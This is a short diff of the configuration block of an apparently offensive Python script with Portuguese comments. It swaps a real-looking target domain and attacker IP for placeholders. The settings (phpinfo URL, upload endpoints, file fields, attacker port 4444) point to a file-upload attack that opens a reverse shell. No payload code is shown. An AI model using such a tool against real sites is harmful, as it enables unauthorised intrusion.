@@ -5,11 +5,11 @@ import sys
 from urllib.parse import urljoin
 
 # === CONFIGURAÇÃO ===
-BASE = "http://www.alvo.com.br/"
+BASE = "https://exemplo.com/app/"
 PHPINFO_URL = urljoin(BASE, "phpinfo.php")
 UPLOAD_PATHS = ["upload.php", "enviar.php", "submit.php", "upload_image.php"]
 FILE_FIELDS = ["file", "upload", "arquivo", "imagem"]
-ATTACKER_IP = "192.000.00.000"  # <-- SUBSTITUA pelo seu IP real
+ATTACKER_IP = "SEU_IP_AUTORIZADO"  # <-- SUBSTITUA pelo seu IP real
 ATTACKER_PORT = 4444
 
 # === FUNÇÕES ===
